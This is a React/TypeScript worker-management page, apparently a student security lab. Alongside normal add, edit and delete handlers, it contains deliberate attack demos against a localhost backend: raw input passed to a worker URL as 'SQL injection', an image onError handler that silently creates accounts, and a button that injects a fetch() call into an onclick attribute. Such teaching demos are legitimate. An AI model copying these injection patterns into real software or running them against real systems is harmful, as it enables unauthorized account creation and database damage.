import {
  Td, Th, Tr, useToast, Select, Button, Badge,
} from '@chakra-ui/react';
import { ChangeEvent, useState } from 'react';
import axios from 'axios';
import styled from 'styled-components';
import SinglePageWrapperComponent from '../../components/singlePageWrapper.component.tsx';
import TableComponent from '../../components/table.component.tsx';
import ModalComponent from '../../components/modal.component.tsx';
import { InvoiceTableHeader, mockedInvoices, WORKERS_TABLE_HEADERS } from '../../mock/mockData.mock.ts';
import InputComponent from '../../components/input.component.tsx';

import { useAppDispatch, useAppSelector } from '../../store';
import {
  addingWorkerThunk,
  deletingWorkersThunk,
  editingWorkerThunk,
  getWorkers,
} from '../../store/reducers/workersReducer.tsx';
import { getProducts } from '../../store/reducers/productReducer.tsx';
import {
  AddWorker,
  INITIAL_WORKER_DATA,
  INITIAL_WORKER_ERRORS,
  Worker,
  WorkerErrors,
} from '../../models/Worker.model.ts';
import api from '../../services/api/AxiosApi.ts';
import { User } from '../../models/User.model.ts';
import { sanitizeData } from '../../services/validators/validator.ts';
import SpanComponent from '../../components/span.component.tsx';

const WORKPLACES = ['PRACOWNIK', 'KIEROWNIK'] as const;

const ButtonsWrapper = styled.div`
  display: flex;
  justify-content: center;
  gap: 10px;
`;

const WorkersPageContainer = () => {
  const toast = useToast();
  const dispatch = useAppDispatch();
  const [addWorkerData, setAddWorkerData] = useState<AddWorker>(INITIAL_WORKER_DATA);
  const [editWorkerData, setEditWorkerData] = useState<AddWorker>(INITIAL_WORKER_DATA);
  const [workerErrors, setWorkerErrors] = useState<WorkerErrors>(INITIAL_WORKER_ERRORS);
  const [editWorkerErrors, setEditWorkerErrors] = useState<WorkerErrors>(INITIAL_WORKER_ERRORS);
  const [sqlInjection, setSqlInjection] = useState<string>('');
  const workers = useAppSelector(getWorkers);

  const selectValues = WORKPLACES.map((workplace) => <option key={workplace} value={workplace}>{workplace}</option>);

  const onChangeHandler = (type: string) => (e: ChangeEvent<HTMLInputElement>) => {
    setAddWorkerData((prevState) => ({
      ...prevState,
      [type]: sanitizeData(e.target.value),
    }));
  };

  const onSelectChangeHandler = (type: string) => (e: ChangeEvent<HTMLSelectElement>) => {
    setAddWorkerData((prevState) => ({
      ...prevState,
      [type]: e.target.value,
    }));
  };

  const onSQLHandler = (e: ChangeEvent<HTMLInputElement>) => {
    setSqlInjection(e.target.value);
  };

  const onSelectEditChangeHandler = (type: string) => (e: ChangeEvent<HTMLSelectElement>) => {
    setEditWorkerData((prevState) => ({
      ...prevState,
      [type]: e.target.value,
    }));
  };

  const onEditChangeHandler = (type: string) => (e: ChangeEvent<HTMLInputElement>) => {
    setEditWorkerData((prevState) => ({
      ...prevState,
      [type]: sanitizeData(e.target.value),
    }));
  };

  const addWorkerHandler = () => {
    const errorData: WorkerErrors = INITIAL_WORKER_ERRORS;
    let isError = false;
    if (addWorkerData.name === '' || addWorkerData.name.includes('&')) {
      errorData.name = 'Invalid name!';
      isError = true;
    }
    if (addWorkerData.surname === '' || addWorkerData.surname.includes('&')) {
      errorData.surname = 'Invalid surname';
      isError = true;
    }
    if (addWorkerData.workplace === '' || addWorkerData.workplace.includes('&')) {
      errorData.workplace = 'Invalid workplace';
      isError = true;
    }
    if (isError) {
      console.log('LOG', errorData);
      setWorkerErrors(errorData);
      toast({
        title: 'Invalid data',
        description: 'Invalid data',
        status: 'error',
        duration: 9000,
        isClosable: true,
        position: 'top-right',
      });
      return;
    }
    dispatch(addingWorkerThunk(addWorkerData));
    toast({
      title: 'Worker added',
      description: 'Worker added',
      status: 'success',
      duration: 9000,
      isClosable: true,
      position: 'top-right',
    });
    setAddWorkerData(INITIAL_WORKER_DATA);
    setWorkerErrors(INITIAL_WORKER_ERRORS);
  };

  const sqlInjectionHandler = async () => {
    const id_worker: string = sqlInjection;
    const res = await api.get(`http://localhost:8000/worker/${id_worker}`);
    console.log('RESPONSE', res);
    toast({
      title: 'Baza w pizdu!',
      status: 'success',
      position: 'top-right',
    });
    setSqlInjection('');
  };

  const editWorkerHandler = (id: string) => {
    const errorData: WorkerErrors = INITIAL_WORKER_ERRORS;
    let isError = false;
    if (editWorkerData.name === '') {
      errorData.name = 'Invalid name!';
      isError = true;
    }
    if (editWorkerData.surname === '' || editWorkerData.surname.includes('&')) {
      errorData.name = 'Invalid surname';
      isError = true;
    }
    if (editWorkerData.workplace === '' || editWorkerData.workplace.includes('&')) {
      errorData.workplace = 'Invalid workplace';
      isError = true;
    }
    if (isError) {
      setEditWorkerErrors(errorData);
      toast({
        title: 'Invalid data',
        description: 'Invalid data',
        status: 'error',
        duration: 9000,
        isClosable: true,
        position: 'top-right',
      });
      return;
    }
    const editData: Worker = {
      id,
      name: editWorkerData.name,
      workplace: editWorkerData.workplace,
      surname: editWorkerData.surname,
    };
    dispatch(editingWorkerThunk(editData));
    toast({
      title: 'Worker edited',
      description: 'Worker edited',
      status: 'success',
      position: 'top-right',
      duration: 9000,
      isClosable: true,
    });
    setEditWorkerData(INITIAL_WORKER_DATA);
    setEditWorkerErrors(INITIAL_WORKER_ERRORS);
  };

  const deleteWorkerHandler = (id: string) => {
    console.log('USUWANIE PRODUKTU');
    dispatch(deletingWorkersThunk(id));
    toast({
      title: 'Worker deleted',
      description: 'Worker deleted',
      status: 'success',
      position: 'top-right',
      duration: 9000,
      isClosable: true,
    });
  };

  // img xss attack
  const imgXssAttack = async () => {
    const requestData = {
      login: 'niebezpiecznik',
      password: 'string5534',
      name: 'string54352',
      surname: 'string645645',
      workplace: 'string53453543',
    };
    try {
      await axios.post('http://localhost:8000/Account/create-unsafe', requestData, { headers: { 'Content-type': 'application/json' } });
    } catch (e) {
      toast({
        title: 'Worker injected',
        description: 'Worker injected',
        status: 'warning',
        position: 'top-right',
        duration: 9000,
        isClosable: true,
      });
    }
  };

  const sqlInjectionModalContent = (
    <div>
      <h4>Wywal sobie bazke tu</h4>
      <InputComponent placeholder="Sql inj" value={sqlInjection} onChange={onSQLHandler} />
    </div>
  );

  const addingWorkerModalContent = (
    <div>
      <h4>Add worker here</h4>
      <InputComponent placeholder="Worker name" value={addWorkerData.name} onChange={onChangeHandler('name')} errorText={workerErrors.name} />
      <InputComponent placeholder="Worker surname" value={addWorkerData.surname} onChange={onChangeHandler('surname')} errorText={workerErrors.surname} />
      <Select placeholder="Select workplace" onChange={onSelectChangeHandler('workplace')} style={{ marginTop: 10 }}>
        {selectValues}
      </Select>
      {workerErrors.workplace && <Badge colorScheme="red">{workerErrors.workplace}</Badge>}
    </div>
  );

  const editingWorkerModalContent = (
    <div>
      <h4>Edit worker here</h4>
      <InputComponent placeholder="Worker name" value={editWorkerData.name} onChange={onEditChangeHandler('name')} errorText={editWorkerErrors.name} />
      <InputComponent placeholder="Worker surname" value={editWorkerData.surname} onChange={onEditChangeHandler('surname')} errorText={editWorkerErrors.surname} />
      <Select placeholder="Select workplace" onChange={onSelectEditChangeHandler('workplace')} style={{ marginTop: 10 }}>
        {selectValues}
      </Select>
      {editWorkerErrors.workplace && <Badge colorScheme="red">{editWorkerErrors.workplace}</Badge>}
      <img src="/niema/adresu" onError={imgXssAttack} />
    </div>
  );

  const deletingWorkerModalContent = (name: string) => (
    <div>
      <h3>
        Do you confirm deleting?
        <SpanComponent text={name} />
      </h3>
    </div>
  );

  // xss poprzez wstrzykniecie onclicka do buttona
  const handleClick = () => {
    const requestData = {
      login: 'string123',
      password: 'string5534',
      name: 'string54352',
      surname: 'string645645',
      workplace: 'string53453543',
    };

    const maliciousCode = `fetch('http://localhost:8000/Account/create-unsafe', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify(${JSON.stringify(requestData)})
});`;
    const element = document.getElementById('myButton');

    element.setAttribute('onclick', maliciousCode);
  };

  const mappedHeaders = WORKERS_TABLE_HEADERS.map((header, index) => <Th isNumeric={header.isNumeric} key={index}>{header.name}</Th>);
  const mappedData = workers.map((data) => (
    <Tr key={data.id}>
      <Td>{data.id}</Td>
      <Td>{data.name}</Td>
      <Td>{data.surname}</Td>
      <Td>{data.workplace}</Td>
      <Td>
        <ModalComponent
          buttonText="Edit"
          modalHeader="Edit worker"
          modalAction={() => editWorkerHandler(data.id)}
          modalContent={editingWorkerModalContent}
        />
      </Td>
      <Td>
        <ModalComponent
          modalHeader="Delete worker"
          buttonText="Delete"
          modalAction={() => deleteWorkerHandler(data.id)}
          modalContent={deletingWorkerModalContent(data.name)}
        />
      </Td>
    </Tr>
  ));
  return (
    <SinglePageWrapperComponent>
      <TableComponent tableCaption="Workers" mappedData={mappedData} mappedHeaders={mappedHeaders} />
      <ButtonsWrapper>
        <ModalComponent buttonText="Add worker" modalAction={addWorkerHandler} modalHeader="Adding worker" modalContent={addingWorkerModalContent} />
        <ModalComponent buttonText="TEST SQL" modalAction={sqlInjectionHandler} modalHeader="SQL Injection" modalContent={sqlInjectionModalContent} />
        <Button id="myButton" onClick={handleClick}>
          XSS INJECTION
        </Button>
      </ButtonsWrapper>
    </SinglePageWrapperComponent>
  );
};

export default WorkersPageContainer;
